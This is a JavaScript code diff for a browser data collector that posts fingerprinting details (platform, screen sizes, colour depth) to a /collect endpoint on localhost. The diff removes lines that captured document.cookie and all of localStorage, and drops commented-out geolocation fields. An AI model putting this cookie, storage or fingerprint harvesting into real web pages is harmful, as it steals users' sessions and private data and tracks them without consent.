@@ -20,9 +20,6 @@ let collected = {};
         browserPlatform: navigator.platform,
         javaEnabled: navigator.javaEnabled(),
         dataCookiesEnabled: navigator.cookieEnabled,
-        dataCookies1: document.cookie,
-        dataCookies2: decodeURIComponent(document.cookie.split(";")),
-        dataStorage: localStorage,
         sizeScreenW: screen.width,
         sizeScreenH: screen.height,
         sizeDocW: document.width,
@@ -33,14 +30,6 @@ let collected = {};
         sizeAvailH: screen.availHeight,
         scrColorDepth: screen.colorDepth,
         scrPixelDepth: screen.pixelDepth,
-        // latitude: position.coords.latitude,
-        // longitude: position.coords.longitude,
-        // accuracy: position.coords.accuracy,
-        // altitude: position.coords.altitude,
-        // altitudeAccuracy: position.coords.altitudeAccuracy,
-        // heading: position.coords.heading,
-        // speed: position.coords.speed,
-        // timestamp: position.timestamp,
         };
 
         fetch("http://localhost:8080/collect", {
